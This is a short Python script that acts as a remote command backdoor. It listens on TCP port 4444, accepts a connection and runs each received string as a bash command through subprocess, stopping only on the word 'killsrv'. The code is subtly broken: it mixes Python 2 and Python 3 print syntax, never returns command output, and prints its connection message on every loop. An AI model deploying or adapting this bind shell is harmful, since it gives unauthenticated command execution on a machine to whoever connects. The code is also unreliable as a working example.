import sys
import socket
import subprocess

agent_host = 'localhost'
agent_port = 4444
socksize = 1024

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((agent_host, agent_port))
print("Server started on port: {}".format(agent_port))

server.listen(1)
print("Agent started\n")
conn, addr = server.accept()

while True:
    print 'New connection from %s:%d' % (addr[0], addr[1])
    data = conn.recv(socksize)
    if not data:
        continue
    elif data == 'killsrv':
        break
    else:
        cmd = ['/bin/bash', '-c', data]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE)
        stdout, stderr = proc.communicate()

server.close()
sys.exit(0)